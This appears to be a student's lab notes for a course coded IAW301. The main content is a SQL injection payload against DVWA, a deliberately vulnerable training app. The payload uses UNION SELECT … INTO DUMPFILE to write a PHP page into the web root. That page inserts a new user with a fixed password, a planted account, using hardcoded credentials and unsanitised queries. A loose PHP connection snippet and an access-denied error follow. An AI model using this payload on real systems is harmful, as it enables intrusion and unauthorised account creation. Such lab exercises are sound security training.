# IAW301
' union select null,'<?php if(isset($_POST["submit"])) { $userID = $_POST["userID"]; $first_name = $_POST["first_name"]; $last_name = $_POST["last_name"]; $username = $_POST["username"]; $avatar = $_POST["avatar"]; echo "userID: $userID<BR>"; echo "first_name: $first_name<BR>"; echo "last_name: $last_name<BR>"; echo "username: $username<BR>"; echo "avatar: $avatar<BR>"; $con=mysqli_connect("127.0.0.1","minhlqhe140825","bnm123456","dvwa"); if (mysqli_connect_errno()) { echo "Failed to connect to MySQL: " . mysqli_connect_error(); } else { echo "Connected to database<BR>"; } $password = "abc123"; $sql="insert into dvwa.users values (\\"$userID\\",\\"$first_name\\",\\"$last_name\\",\\"$username\\",MD5(\\"$password\\"),\\"$avatar\\")"; if (mysqli_query($con,$sql)) { echo "[Successful Insertion]: $sql"; } else { echo "Error creating database: " . mysqli_error($con); } mysqli_close($con); } ?> <form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>"> <input type="text" name="userID" value="33"><br> <input type="text" name="first_name" value="John"><br> <input type="text" name="last_name" value="Gray"><br> <input type="text" name="username" value="jgray"><br> <input type="text" name="avatar" value="Just Hack It!"><br> <input type="submit" name="submit" value="Submit Form"><br> </form>' INTO DUMPFILE 'C:\xampp\htdocs\DVWA\create_user.php' -- -

<?php
    mysqli_connect("localhost", "root", "", "GFG");
 
    if(mysqli_connect_error())
        echo "Connection Error.";
    else
        echo "Database Connection Successfully.";
?>

mysqli_connect(): (HY000/1045): Access denied for user
